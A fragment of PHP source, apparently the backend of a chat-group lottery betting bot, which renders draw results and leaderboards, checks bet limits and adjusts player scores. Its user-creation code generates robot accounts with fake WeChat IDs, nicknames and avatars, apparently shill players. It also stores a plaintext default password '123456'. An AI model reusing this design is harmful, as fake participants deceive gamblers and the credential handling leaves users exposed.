        $uname = $game['name'];
        $CodeArr = codeArr($kj);
        if (!hasSys($type, $endQh2, 'kai')) {
            $showFan = ($type != 75) ? '<span class="kpfan"><span class="fan">' . getFan($kj) . '</span>番</span>' : '';
            $kai = '<div class="kaipan"><div class="kphead"><span class="kpone">开盘结果</span><span class="di">第<span class="qi">' . $kj['QiHao'] . '</span>期</span></div><div class="kptwo"><span class="kptime">' . $kj['dtOpen'] . '</span>' . $showFan . '</div><div class"kai">';
            foreach ($CodeArr as $k => $value) {
                $hong = qiuHong($value, $game, $k);
                if (!$game['hasKey']) {
                    $kai .= '<span class="kpqiu hong ' . $hong . '">' . $value . '</span>';
                    if ($k == 3) {
                        $kai .= '<span class="kpqiu qiuhong nohong">+</span>';
                    }
                } else {
                    $kai .= '<span class="kpqiu ' . $hong . '">' . $value . '</span>';
                }
            }
            if (!$game['hasTe']) {
                $kai .= '<span class="kpqiu" style="border:none;width: auto;">=</span>';
                $kai .= '<span class="kpqiu qiuhong">' . getCum($kj) . '</span>';
            }
            if (!$game['hasKey']) {
                $kai .= '<span class="kpqiu qiuhong yellow75">' . getCum($kj) . '</span>';
                $kai .= '<span class="kpqiu qiuhong yellow75">' . getLongHu($kj) . '</span>';
            }
            $kai .= '</div>';
            if (!$game['hasKey']) {
                $kai .= bgKj($kj);
            }
            if ($game['hasSelect']) {
                $kai .= '<div class="kai">';
                foreach ($CodeArr as $k => $value) {
                    $qiuFan = getQiuFan($kj, $k);
                    $kai .= '<span class="kpqiu color' . $qiuFan . '">' . $qiuFan . '</span>';
                }
                $kai .= '</div>';
            }
            $kai .= '</div>';
            addMsg2(['uid' => $uname, 'id' => $uname, 'gameType' => $type], ['UserName' => $uname], $kai, $endQh2, 'kai', 1, 1);
        }
        if (!hasSys($type, $endQh2, 'kai2')) {
            $open2 = db('history')->where('type', $type)->where('Code', '<>', '')->order('id desc')->limit($ls)->select();
            cache('qiList' . $type, $open2);
            $lishi = '<div class="card2"><div class="tbhead"><span>期数</span><span></span><span>结果</span>' . ($type != 75 ? '<span>番</span>' : '') . '</div><div class="list">';
            foreach ($open2 as $k => $value) {
                if ($k < 13) {
                    $time = explode(' ', $value['dtOpen']);
                    $bor = ($k == 0 ? 'border:1px solid #ec5d5d;' : '');
                    $lishi .= '<div style="display: flex;justify-content:space-around;background:#fff;align-items: center;width:100%;line-height:26px;box-sizing:border-box;' . $bor . '"><span class="qihao">' . substr($value['QiHao'], -3) . '</span><span class="shijian">' . date('', strtotime($value['dtOpen'])) . '</span><span class="haoma">';
                    $list2 = explode(',', $value['Code']);
                    foreach ($list2 as $y => $val) {
                        $hong = qiuHong($val, $game, $y);
                        if (!$game['hasKey']) {
                            $lishi .= '<span class="hong ' . $hong . '">' . $val . '</span>';
                            if ($y == 3) {
                                $lishi .= '<span class="hong nohong">+</span>';
                            }
                        } else {
                            $lishi .= '<span class="' . $hong . '">' . $val . '</span>';
                        }
                    }
                    if (!$game['hasTe']) {
                        $lishi .= '<span style="border:none;width: auto;">=</span>';
                        $lishi .= '<span class="hong">' . getCum($value) . '</span>';
                    }
                    if (!$game['hasKey']) {
                        $lishi .= '<span class="hong yellow75">' . getCum($value) . '</span>';
                        $lishi .= '<span class="hong yellow75">' . getLongHu($value) . '</span>';
                    }
                    $lifan = getFan($value);
                    $lidan = getKjDs($value);
                    $lida = getKjDx($value);
                    if (!$game['hasKey']) {
                        $lishi .= bgKj($value);
                    }
                    $lishi .= '</span><span class="three" ' . (!$game['hasKey'] ? 'style="display:none;"' : '') . '><span class="colorfan color' . $lifan . '">' . $lifan . '</span><span class="da">' . $lida . '</span><span class="dan">' . $lidan . '</span></span></div>';
                }
            }
            if ($game['hasSelect']) {
                $lishi .= '</div><div class="luzi"><table border="1" cellspacing="0"><thead><tr><th></th><th><p style="font-weight: bolder;font-size: 14px;">1球</p></th><th><p style="font-weight: bolder;font-size: 14px;">2球</p></th><th>路<p style="font-weight: bolder;font-size: 14px;">3球</p></th><th>字<p style="font-weight: bolder;font-size: 14px;">4球</p></th><th>图<p style="font-weight: bolder;font-size: 14px;">5球</p></th><th><p style="font-weight: bolder;font-size: 14px;">6球</p></th><th><p style="font-weight: bolder;font-size: 14px;">7球</p></th><th><p style="font-weight: bolder;font-size: 14px;">8球</p></th></tr></thead><tbody class="lu">';
                foreach ($open2 as $i => $value) {
                    $lishi .= '<tr>';
                    if ($i < 15) {
                        $lishi .= '<td><span class="color5">' . substr($value['QiHao'], -2) . '</span></td>';
                        $list2 = explode(',', $value['Code']);
                        foreach ($list2 as $y => $val) {
                            $zoufan = getQiuFan($value, $y);
                            $lishi .= '<td><span class="color' . $zoufan . '">' . $zoufan . '</span></td>';
                        }
                    }
                    $lishi .= '</tr>';
                }
            } else {
                $open2 = array_reverse($open2);
                $len = round(count($open2) / 12);
                $wf = $game['wf'];
                $wfArr = preg_split('//u', $wf, -1, PREG_SPLIT_NO_EMPTY);
                $wfStr = '';
                foreach ($wfArr as $value) {
                    $wfStr .= '<th>' . $value . '</th>';
                }
               // $lishi .= '</div><div class="luzi" ' . (!$game['hasKey'] ? 'style="display:none;"' : '') . '><table border="1" cellspacing="0"><thead><tr>' . ($wf ? $wfStr : '<th></th><th></th><th></th>') . '<th></th><th></th><th></th><th></th><th>路</th><th>字</th><th>图</th><th></th><th></th><th></th><th></th></thead><tbody class="lu">';
                $lishi .= '</div><div class="luzi" ' . (!$game['hasKey'] ? 'style="display:none;"' : '') . '><table border="1" cellspacing="0"><thead><tr>' . ($wf ? $wfStr : '<th></th><th></th><th></th>') . '<th></th><th>路</th><th>字</th><th>图</th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody class="lu">';
                for ($i = 0; $i < ($len + 1); $i++) {
                    $lishi .= '<tr>';
                    for ($y = ($i * 12); $y < count($open2); $y++) {
                        if ($y < ($i + 1) * 12) {
                            if ($open2[$y]['Code'] == '') {
                                $lishi .= '<td><span class="color5"></span></td>';
                            } else {
                                $zoufan = getFan($open2[$y]);
                                $lishi .= '<td><span class="color' . $zoufan . '">' . $zoufan . '</span></td>';
                            }
                        }
                    }
                    $lishi .= '</tr>';
                }
            }
            $lishi .= '</tbody></table></div></div>';
            addMsg2(['uid' => $uname, 'id' => $uname, 'gameType' => $type], ['UserName' => $uname], $lishi, $endQh2, 'kai2', 1, 1);
        }
        foreach ($rb as $userVal) {
            $userVal['gameType'] = $type;
            $uname = $userVal['UserName'];
            $user = ['uid' => $uname, 'id' => $uname, 'gameType' => $type];
            $admin = ['UserName' => $userVal['uid']];
            if (!$game['hasKey']) {
                if (!hasSys($type, $endQh2, 'kai6', $uname)) {
                    $all = db('record')->where('rid', $uname)->where('gameType', $type)->where('qihao', $endQh2)->where('type', 3)->select();
                    $allStr = '获奖排名:
';
                    if (count($all) > 0) {
                        $zhongArr = [];
                        foreach ($all as $value) {
                            if (!in_array($value['wid'], $zhongArr)) {
                                $teNum = '';
                                $hasScore = 0;
                                foreach ($all as $yingVal) {
                                    if ($yingVal['wid'] == $value['wid']) {
                                        $yingVal['text'] = str_replace($yingVal['score'], "", $yingVal['text']);
                                        $yingVal['text'] = str_pad($yingVal['text'], 7, " ");
                                        if ($yingVal['ying'] == 1) {
                                            if (strstr($yingVal['text'], '特')) {
                                                $teArr = explode('特', $yingVal['text']);
                                                // floatval
                                                $teNum .= '   "' . getCum($kj, $yingVal) . '特' . $teArr[1] . ' [-' . sprintf('%.1f', $yingVal['yingScore']) . ']';
                                            } else {
                                                $teNum .= '   "' . $yingVal['text'] . ' [-' . sprintf('%.1f', $yingVal['yingScore']) . ']';
                                            }
                                        } else {
                                            $teNum .= '   "' . $yingVal['text'] . ' [-' . $yingVal['score'] . ']';
                                        }
                                        $hasScore = sprintf('%.1f', $yingVal['afterScore']);
                                    }
                                }
                                $uName = str_pad($value['wid'], 15, " ");
                                $hasScore = str_pad($hasScore, 6, " ");
                                $allStr .=  '(' . $uName . ') ' . ' ' . $hasScore . ' ' . $teNum . '
';
                                array_push($zhongArr, $value['wid']);
                            }
                        }
                    }
                    $allStr .= '--------------------
时间:' . date('Y/m/d H:i:s') . '';
                    addMsg2($user, $admin, $allStr, $endQh2, 'kai6', 0);
                }
            } else {
                if (!hasSys($type, $endQh2, 'kai6', $uname)) {
                    $all = db('record')->where('rid', $uname)->where('gameType', $type)->where('qihao', $endQh2)->where('type', 3)->where('ying', 1)->select();
                    $allStr  = '
' . $endQh2 . '结果:
' . $kj['Code'] . ' => ' . getFan($kj) . ',' . getKjDs($kj) . ',' . getKjDx($kj) . getLongHu($kj) . '
';
                    if ($game['hasSelect']) {
                        foreach ($CodeArr as $i => $val) {
                            $allStr .= '第' . ($i + 1) . '球/' . $val . '=>' . getQiuFan($kj, $i) . ', ' . getDx($kj, $i) . ', ' . getDs($kj, $i) . '
';
                        }
                    }
                    $allStr .= '----------
' . '获胜名单：
' . '';
                    if (count($all) > 0) {
                        $zhongArr = [];
                        foreach ($all as $value) {
                            if (!in_array($value['wid'], $zhongArr)) {
                                $teNum = '';
                                foreach ($all as $yingVal) {
                                    if ($yingVal['wid'] == $value['wid']) {
                                        $qiu = getQiuWf($type, $yingVal['qiuNum']);
                                        if (strstr($yingVal['text'], '特')) {
                                            $teArr = explode('特', $yingVal['text']);
                                            // floatval
                                            $teNum .= '   "' . $qiu . getCum($kj, $yingVal) . '特' . $teArr[1] . '" 盈:' . sprintf('%.1f', $yingVal['yingScore']) . '';
                                        } else {
                                            $teNum .= '   "' . $qiu . $yingVal['text'] . '" 盈:' . sprintf('%.1f', $yingVal['yingScore']) . '';
                                        }
                                    }
                                }
                                $allStr .=  '(' . $value['wid'] . ') ' . $teNum . '
';
                                array_push($zhongArr, $value['wid']);
                            }
                        }
                    }
                    $allStr .= '
时间:' . date('Y/m/d H:i:s') . '';
                    addMsg2($user, $admin, $allStr, $endQh2, 'kai6', 0);
                }
                if (!hasSys($type, $endQh2, 'kai5', $uname)) {
                    $all = db('record')->where('rid', $uname)->where('gameType', $type)->where('qihao', $endQh2)->where('type', 3)->select();
                    $alluser = db('rbuser')->where('uid', $uname)->order('score desc')->select();
                    $count = 0;
                    $jie = '';
                    $arrzy = [];
                    list($arr, $allQi, $yijie, $weijie) = resetOrder($all);
                    $userDetail = $arr['detail'];
                    foreach ($alluser as $value) {
                        // 修改总榜小金额大于0才显示
                        //if($value['score']>0){
                      // 先判断 score 是否大于等于 1，再进行累加操作
                        if ($value['score'] >= 1) {
                            $count += $value['score'];
                            $jie .= (strlen($value['NickName']) > 32 ? mb_substr($value['NickName'], 0, 2) : $value['NickName']) . '   [' . ($value['score'] < 0 ? '0.0' : $value['score']) . '] ';
                            foreach ($userDetail as $val) {
                                if ($value['wxid'] == $val['wxid']) {
                                    // $count += $val['score'];
                                    $jie .= (($val['zong'] == 0) ? "" : '(' . (($val['ying'] - $val['ben'] > 0) ? ('+' . sprintf('%.1f', ($val['ying'] - $val['ben']))) : sprintf('%.1f', ($val['ying'] - $val['ben']))) . ')');
                                       break;
                                }
                            }
                            $jie .= '
';
                        }
                    }
                    $allStr = $endQh2 . '结果:
' . $kj['Code'] . ' => ' . getFan($kj) . ',' . getKjDs($kj) . ',' . getKjDx($kj) . getLongHu($kj) . '
--------------------
总榜: 【' . sprintf('%.1f', $count) . '】
';
                    $allStr .= $jie;
                    addMsg2($user, $admin, $allStr, $endQh2, 'kai5', 0);
                }
                if (!hasSys($type, $endQh2, 'kai3', $uname)) {
                    $hisStr = getLishi($game);
                    addMsg2($user, $admin, $hisStr, $endQh2, 'kai3', 1);
                }
            }
            cache('last' . $userVal['id'] . $type, false);
            cache('feng' . $userVal['id'] . $type, false);
            cache('xiazhulist' . $userVal['id'] . $type, []);
        }
        cache('dangqi' . $type, $qh);
        cache('shangqi' . $type, $qh);
        cache('kaijiang' . $type, false);
        db('history')->where('type', $type)->where('QiHao', $sq)->update(['js' => 1]);
    }
}

function getWpType($value, $key, $isfd = false)
{
    if ($isfd) {
        $val = $value[$key] == '2' ? 'b' : ($value[$key] == '3' ? 'c' : ($value[$key] == '4' ? 'd' : 'a'));
    } else {
        $val = $value[$key] == '2' ? 'B' : ($value[$key] == '3' ? 'C' : ($value[$key] == '4' ? 'D' : 'A'));
    }
    return $val;
}

function numToChinese($num)
{
    $chineseNumbers = ['零', '一', '二', '三', '四', '五', '六', '七', '八'];
    $result = $chineseNumbers[$num];
    return $result;
}

function httpRequest($url, $method = 'GET', $params = null, $headers = array(), $pem = array(), $debug = false, $timeout = 60)
{
    $method = strtoupper($method);
    $ci = curl_init();
    /* Curl settings */
    curl_setopt($ci, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);
    curl_setopt($ci, CURLOPT_USERAGENT, 'Google/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36');
    // curl_setopt($ci, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ci, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ci, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($ci, CURLOPT_POST, TRUE);
    if (!empty($params)) {
        $tmpdatastr = is_array($params) ? http_build_query($params) : $params;
        curl_setopt($ci, CURLOPT_POSTFIELDS, $tmpdatastr);
    }
    curl_setopt($ci, CURLOPT_URL, $url);
    curl_setopt($ci, CURLOPT_MAXREDIRS, 2);
    curl_setopt($ci, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ci, CURLINFO_HEADER_OUT, true);
    curl_setopt($ci, CURLOPT_HEADER, true);

    $response = curl_exec($ci);
    $requestinfo = curl_getinfo($ci);
    // $http_code = curl_getinfo($ci, CURLINFO_HTTP_CODE);

    // $headerSize = curl_getinfo($ci , CURLINFO_HEADER_SIZE);
    // $headerStr = substr( $response , 0 , $headerSize );
    // $bodyStr = substr( $response , $headerSize );
    // $responseHeader = headerHandler($headerStr);
    return $requestinfo;
}
function headerHandler($str)
{
    $headers = array();
    $headersTmpArray = explode("\r\n", $str);
    for ($i = 0; $i < count($headersTmpArray); ++$i) {
        if (strlen($headersTmpArray[$i]) > 0) {
            if (strpos($headersTmpArray[$i], ':')) {
                $headerName = substr($headersTmpArray[$i], 0, strpos($headersTmpArray[$i], ':'));
                $headerValue = substr($headersTmpArray[$i], strpos($headersTmpArray[$i], ':') + 1);
                $headers[$headerName] = $headerValue;
            }
        }
    }
    return $headers;
}

function getRecord($data, $bool)
{
    $msg = [];
    $user = session('user_find');
    $gid = $user['gid'];
    $game = db('rbgame')->where('gameType', $gid)->where('status', 1)->find();
    if ($data['count'] == 0) {
        $res = db('record')->where('rid=:id OR uid=:name ', ['id' => session('user_id3'), 'name' => $game['name']])->where('gameType', $gid)->where('isSHow', 1)->order('id desc')->limit(15)->select();
        $res = array_reverse($res);
    } else {
        if ($bool) {
            $res = db('record')->where('rid=:id OR uid=:name ', ['id' => session('user_id3'), 'name' => $game['name']])->where('gameType', $gid)->where('isSHow', 1)->where('id', '>', $data['count'])->limit(30)->select();
        } else {
            $res = db('record')->where('rid=:id OR uid=:name ', ['id' => session('user_id3'), 'name' => $game['name']])->where('gameType', $gid)->where('isSHow', 1)->where('id', '<', $data['count'])->order('id desc')->limit(30)->select();
        }
    }
    foreach ($res as $value) {
        array_push($msg, ["type" => $value['wxid'] == 0 ? 1 : 2, "name" => $value['NickName'], "content" => $value['cmd'], "rank" => $user['wxid'] == $value['wxid'] ? 1 : 2, "ids" => $value['id'], "headimg" => $value['headimg'], "wxid" => $value['wxid'], 'atUser' => $value['sys'], 'wid' => $value['wid']]);
    }
    return $msg;
}

function getCum($kj, $val = '')
{
    $CodeArr = codeArr($kj);
    $game = cache('gameList');
    foreach ($game as $value) {
        if ($value['gameType'] == $kj['type']) {
            $jstype = $value['jsType'];
            $qiuNum = $val ? $val['qiuNum'] : 8;
            $jsj = $value['qiuNum'];
            $sum = ($jsj == 1 ? '' : 0);
        }
    }
    $jsArr = explode(',', $jstype);
    foreach ($CodeArr as $k => $value) {
        if ($kj['type'] == 17) {
            if ($qiuNum - 1 == $k) {
                $sum = getjsj($sum, $jsj, $CodeArr[$qiuNum - 1]);
            }
        } else {
            if (in_array($k + 1, $jsArr)) {
                $sum = getjsj($sum, $jsj, $value);
            }
        }
    }
    if ($sum == 100 && $jsj == 1) {
        $sum = '00';
    }
    return $sum;
}

function getjsj($sum, $jsj, $value)
{
    if ($jsj == 1) {
        $sum .= intval($value);
    } else {
        $sum += intval($value);
    }
    return $sum;
}

function getFan($kj, $val = '')
{
    if ($kj['type'] == 75) {
        return getCum($kj);
    }
    $sum = getCum($kj, $val);
    return $sum % 4 == 0 ? 4 : $sum % 4;
}

function getQiuFan($kj, $frist)
{
    $CodeArr = codeArr($kj);
    $sum = $CodeArr[$frist];
    return $sum % 4 == 0 ? 4 : $sum % 4;
}

function getDs($kj, $frist)
{
    $CodeArr = codeArr($kj);
    $sum = $CodeArr[$frist];
    $dan = $sum % 2 == 1 ? '单' : '双';
    return $dan;
}

function getDx($kj, $frist)
{
    $CodeArr = codeArr($kj);
    $sum = $CodeArr[$frist];
    $da = $sum > 10 ? '大' : '小';
    return $da;
}

function getKjDs($kj, $val = '')
{
    if ($kj['type'] == 75) {
        return getZongDs($kj);
    }
    $sum = getCum($kj, $val);
    $dan = $sum % 2 == 1 ? '单' : '双';
    return $dan;
}

function getKjDx($kj, $val = '')
{
    if ($kj['type'] == 75) {
        return getZongDx($kj) . ',';
    }
    if(in_array($kj['type'], array(5,55,502,28,77,174,10,18))){
        $sum =  getFan($kj, $val);
        $da = $sum > 2 ? '大' : '小';
    }else{
        $sum = getCum($kj, $val);
        if ($kj['type'] == '5') {
            $da = $sum > 23 ? '大' : ($sum == 23 ? '和' : '小');
        } else {
            $da = $sum > 10 ? '大' : '小';
        }
    }
    return $da;
}

function getFanDx($sum)
{
    $da = $sum > 2 ? '大' : '小';
    return $da;
}


function getQiuDx($kj, $frist, $type = true)
{
    $CodeArr = codeArr($kj);
    $sum = $CodeArr[intval($frist) - 1];
    $da = $sum > 40 ? '大' : '小';
    return $type ? $frist . $da : $da;
}

function getQiuDs($kj, $frist, $type = true)
{
    $CodeArr = codeArr($kj);
    $sum = $CodeArr[intval($frist) - 1];
    $dan = $sum % 2 == 1 ? '单' : '双';
    return $type ? $frist . $dan : $dan;
}

function getQiuWdx($kj, $frist, $type = true)
{
    $CodeArr = codeArr($kj);
    $sum = $CodeArr[intval($frist) - 1];
    $sum = substr($sum, -1);
    $da = $sum >= 5 ? '尾大' : '尾小';
    return $type ? $frist . $da : $da;
}

function getZongDx($kj)
{
    $CodeArr = codeArr($kj);
    $sum = getCum($kj);
    $da = $sum > 202 ? '大' : '小';
    return $da;
}

function getZongDs($kj)
{
    $CodeArr = codeArr($kj);
    $sum = getCum($kj);
    $dan = $sum % 2 == 1 ? '单' : '双';
    return $dan;
}

function getZongWdx($kj)
{
    $CodeArr = codeArr($kj);
    $sum = getCum($kj);
    $sum = substr($sum, -1);
    $da = $sum >= 5 ? '尾大' : '尾小';
    return $da;
}

function getLongHu($kj)
{
    if ($kj['type'] != 75) {
        return '';
    }
    $CodeArr = codeArr($kj);
    $sum1 = $CodeArr[0];
    $sum5 = $CodeArr[4];
    if ($sum1 < $sum5) {
        return "虎";
    } else {
        return "龙";
    }
    return ($sum1 > $sum5) ? '龙' : '虎';
}

function isUse($wan, $admin, $data, $last)
{
    if ($wan['score'] < $last) {
        addMsg($wan, $admin, '@' . $data['dluser'] . ', 您当前积分不足' . $last . '!', $data['qh']);
        return false;
    } else {
        return true;
    }
}

function xiazhu($wan, $admin, $data, $money, $zongxiaList, $xian, $map, $str, $usre, $isTe = false, $danjia = 0)
{
    $istId = 0;
    if (isUse($wan, $admin, $data, $money)) {
        if (!$isTe) {
            $xiaList = db('record')->where('gameType', $wan['gameType'])->where('type', 3)->where('rid', $wan['uid'])->where('wid', $wan['NickName'])->where('qihao', $data['qh'])->where('isTuo', 0)->where($map)->sum('score');
        } else {
            $xiaList = 0;
        }
        if ($money < $usre['zuidi']) {
            $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ' "' . $str . '" 最低下注' . $usre['zuidi'] . '元', $data['qh']);
        } else if ($money > $usre['zuigao']) {
            $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ' "' . $str . '" 最高下注' . $usre['zuigao'] . '元', $data['qh']);
        } else {
            if ($xian < ($money + $xiaList) && !$isTe) {
                $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ' "' . $str . '" 超出此玩法最大投注限额，5最多可下' . ($xian - $xiaList), $data['qh']);
            } else {
                if ($usre['total'] < ($money + $zongxiaList)) {
                    $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ' "' . $str . '" 超出总场最大投注限额，剩余可下' . ($usre['total'] - $zongxiaList), $data['qh']);
                } else {
                    $sdec = db('rbuser')->where('wxid', $data['wxid'])->where('uid', $wan['uid'])->setDec('score', $money);
                    if ($sdec > 0) {
                        $istId = addDan3($wan, $admin, $money, $str, $data['qh'], $danjia, 1);
                        if ($usre['type'] === 75) {
                            $usre['xiaId'] = $istId;
                            $xiaLists = [['m' => $money, 'cmd' => $str, 'd' => $money, 'xiaId' => $usre['xiaId']]];
                            // feidan($wan,$str,$usre['xiaId'],$xiaLists);
                        }
                    }
                }
            }
        }
    }
    return $istId;
}

function xiazhu4($wan, $admin, $data, $money, $zongxiaList, $xian, $map, $str, $usre, $isTe = false, $danjia = 0, $ma)
{
    if ($wan['score'] < $money) {
        $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ', 您当前积分不足' . $money . '!', $data['qh']);
    } else {
        if (!$isTe) {
            $xiaList = db('record')->where('gameType', $wan['gameType'])->where('type', 3)->where('wid', $wan['NickName'])->where('rid', $wan['uid'])->where('qihao', $data['qh'])->where('isTuo', 0)->where($map)->sum('score');
        } else {
            $xiaList = 0;
        }
        if ($money < $usre['zuidi']) {
            $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ' "' . $str . '" 最低下注' . $usre['zuidi'] . '元', $data['qh']);
        } else if ($money > $usre['zuigao']) {
            $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ' "' . $str . '" 最高下注' . $usre['zuigao'] . '元', $data['qh']);
        } else {
            if ($xian < ($money + $xiaList) && !$isTe) {
                $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ' "' . $str . '" 超出此玩法最大投注限额，6最多可下' . ($xian - $xiaList), $data['qh']);
            } else {
                if ($usre['total'] < ($money + $zongxiaList)) {
                    $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ' "' . $str . '" 超出总场最大投注限额，剩余可下' . ($usre['total'] - $zongxiaList), $data['qh']);
                } else {
                    $sdec = db('rbuser')->where('wxid', $data['wxid'])->where('uid', $wan['uid'])->setDec('score', $money);
                    if ($sdec > 0) {
                        $istId = addDan4($wan, $admin, $money, $str, $data['qh'], $danjia, 1, $ma);
                    } else {
                        $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ', 下注失败!', $data['qh']);
                    }
                }
            }
        }
    }
    return $istId;
}

function xiazhu3($wan, $admin, $data, $money, $zongxiaList, $xian, $map, $str, $usre, $isTe = false, $danjia = 0, $moneyall)
{
    if ($wan['score'] < $money) {
        $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ', 您当前积分不足' . $money . '!', $data['qh']);
    } else {
        if (!$isTe) {
            $xiaList = db('record')->where('gameType', $wan['gameType'])->where('type', 3)->where('wid', $wan['NickName'])->where('rid', $wan['uid'])->where('qihao', $data['qh'])->where('isTuo', 0)->where($map)->sum('score');
        } else {
            $xiaList = 0;
        }
        if ($money < $usre['zuidi']) {
            $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ' "' . $str . '" 最低下注' . $usre['zuidi'] . '元', $data['qh']);
        } else if ($money > $usre['zuigao']) {
            $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ' "' . $str . '" 最高下注' . $usre['zuigao'] . '元', $data['qh']);
        } else {
            if ($xian < ($moneyall + $xiaList) && !$isTe) {
                $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ' "' . $str . '" 超出此玩法最大投注限额，7最多可下' . ($xian - $xiaList), $data['qh']);
            } else {
                if ($usre['total'] < ($money + $zongxiaList)) {
                    $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ' "' . $str . '" 超出总场最大投注限额，剩余可下' . ($usre['total'] - $zongxiaList), $data['qh']);
                } else {
                    return ['bol' => true, 'id' => ''];
                }
            }
        }
    }
    return ['bol' => false, 'id' => $istId];
}

function xiazhu2($wan, $admin, $data, $money, $zongxiaList, $xian, $map, $str, $usre, $isTe = false, $danjia = 0)
{
    if (isUse($wan, $admin, $data, $money)) {
        if (!$isTe) {
            $xiaList = db('record')->where('gameType', $wan['gameType'])->where('type', 3)->where('wid', $wan['NickName'])->where('rid', $wan['uid'])->where('qihao', $data['qh'])->where('isTuo', 0)->where($map)->sum('score');
        } else {
            $xiaList = 0;
        }
        if ($money < $usre['zuidi']) {
            $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ' "' . $str . '" 最低下注' . $usre['zuidi'] . '元', $data['qh']);
        } else if ($money > $usre['zuigao']) {
            $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ' "' . $str . '" 最高下注' . $usre['zuigao'] . '元', $data['qh']);
        } else {
            if ($xian < ($money + $xiaList) && !$isTe) {
                $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ' "' . $str . '" 超出此玩法最大投注限额，8最多可下' . ($xian - $xiaList), $data['qh']);
            } else {
                if ($usre['total'] < ($money + $zongxiaList)) {
                    $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ' "' . $str . '" 超出总场最大投注限额，剩余可下' . ($usre['total'] - $zongxiaList), $data['qh']);
                } else {
                    return true;
                }
            }
        }
    }
    return false;
}

function xzjs($value, $status, $score, $score2, $ying, $kai = '')
{
    db('record')->where('id', $value['id'])->update(['ying' => $status, 'yingScore' => $score, 'totalYing' => $score2, 'kai' => $kai]);
    if ($status == 1 || $status == 3) {
        db('rbuser')->where('wxid', $value['name'])->where('uid', $value['rid'])->setInc('score', ($score + $ying));
        $money = db('rbuser')->where('wxid', $value['name'])->where('uid', $value['rid'])->value('score');
        db('record')->where('id', $value['id'])->update(['afterScore' => $money]);
    }
}

function getOpenInfo($type)
{

    return $type;
}

function rbUpdate($data, $type = false)
{
    if ($type) {
        $res = db('robot')->where('UserName', $type)->update($data);
    } else {
        $res = db('robot')->where('UserName', session('user_id2'))->update($data);
        $result = db('robot')->where('UserName', session('user_id2'))->find();
        session('rbInfo', $result);
    }
    return $res;
}

function flyUpdate($data)
{
    $res = db('rbfly')->where('uid', session('user_id2'))->update($data);
    return $res;
}

function userUpdate($data, $arr)
{
    $res = db('rbuser')->where('wxid', $data['wxid'])->update($arr);
    return $res;
}

function rbUpdown($data, $rb, $type)
{
    $score = $type ? $data['up'] : $data['down'];
    if ($type) {
        db('robot')->where('UserName', $data['rb'])->setInc('score', $score);
        db('admin')->where('UserName', $rb['uid'])->setDec('score', $score);
    } else {
        db('robot')->where('UserName', $data['rb'])->setDec('score', $score);
        db('admin')->where('UserName', $rb['uid'])->setInc('score', $score);
    }
    db('folder_record')->insert([
        'type' => $type ? 0 : 1,
        'dt' => date('Y/m/d H:i:s'),
        'msg' => '为' . $data['rb'] . '上分' . $score,
        'score' => ($type ? $score : (-$score)),
        'uid' => $rb['uid']
    ]);
}

function addReal($isrb, $isauto)
{
    $arr = user_inf($isrb, $isauto);
    $id = db('rbuser')->insertGetId($arr);
    share($id, $arr['code']);
    return $arr;
}

function user_inf($isrb, $isauto, $uname = '', $nname = '', $pwd = '123456', $img = '')
{
    $wxid = rand_str(13);
    $user = session('rbInfo');
    $rbuser = db('rbuser')->order('id desc')->find();
    $arr = [
        'UserName' => $uname ? $uname : rand_str(6),
        'password' => $pwd,
        'dtExpired' => time(),
        'isrobot' => $isrb,
        'NickName' => $nname ? $nname : ($isrb == 1 ? unicode_decode(3) . ((int)$rbuser['id'] + 1) : '新用户' . ((int)$rbuser['id'] + 1)),
        'imgName' => $img ? $img : ('/static/xz/admin/u__chat_img' . rand(1, 100) . '.jpg'),
        //'imgName' => $img ? $img : ('/static/xz/admin/defaultheadimg.jpg'),
        'code' => rand_str(40),
        'wxid' => 'wxid_' . $wxid,
        'isauto' => $isauto,
        'uid' => session('user_id2'),
        'PeiLv' => isset($user['PeiLv']) ? $user['PeiLv'] : 0,
        'FanShui' => isset($user['FanShui']) ? $user['FanShui'] : 0,
        'logincode' => mt_rand(1000, 9999),
        'tuoMin' => 30,
        'tuoMax' => 300
    ];
    return $arr;
}

function getTimeList()
{
    $d = date('Y-m-d');
    if (date('H') > '5') {
        $t = date('Y-m-d', strtotime($d));
    } else {
        $t = date('Y-m-d', strtotime("$d -1 day"));
    }
    return $t;
}

function getTimeList2()
{
    $d = date('Y-m-d');
    if (date('H') > '5') {
        $t = date('Y-m-d', strtotime("$d -1 day"));
    } else {
        $t = date('Y-m-d', strtotime("$d -2 day"));
    }
    return $t;
}

function getTimeList3()
{
    $d = date('Y-m-d');
    if (date('H') > '5') {
        $t = date('Y-m-d', strtotime("$d -2 day"));
    } else {
        $t = date('Y-m-d', strtotime("$d -3 day"));
    }
    return $t;
}

function getTimeList4()
{
    $d = date('Y-m-d');
    if (date('H') > '5') {
        $t = date('Y-m-d', strtotime("$d -3 day"));
    } else {
        $t = date('Y-m-d', strtotime("$d -4 day"));
    }
    return $t;
}

function getTimeList5()
{
    $d = date('Y-m-d');
    if (date('H') > '5') {
        $t = date('Y-m-d', strtotime("$d -4 day"));
    } else {
        $t = date('Y-m-d', strtotime("$d -5 day"));
    }
    return $t;
}

function get_ls_index($type)
